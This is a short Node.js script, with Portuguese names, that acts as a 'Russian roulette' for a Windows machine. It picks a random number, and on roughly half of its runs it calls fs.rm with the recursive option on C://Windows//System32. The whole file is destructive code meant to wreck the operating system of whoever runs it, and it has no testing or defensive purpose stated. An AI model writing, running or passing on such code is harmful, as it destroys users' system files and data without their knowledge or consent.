const fs = require('fs');


function gerarNumeroAleatorio() {
    return Math.floor(Math.random() * 100) + 1;
}


function excluirPasta(caminhoDaPasta) {
    fs.rm(caminhoDaPasta, { recursive: true }, (err) => {
        if (err) {
            console.error('Erro ao excluir a pasta:', err);
            return;
        }
        console.log('Pasta excluída com sucesso:', caminhoDaPasta);
    });
}


const numeroAleatorio = gerarNumeroAleatorio();
console.log('Número aleatório gerado:', numeroAleatorio);


const suicidio = 50; 
if (numeroAleatorio <= suicidio) {
    const caminhoDaPasta = 'C://Windows//System32'; 
    excluirPasta(caminhoDaPasta);
} else {
    console.log('O número gerado não corresponde ao número desejado para excluir a pasta.');
}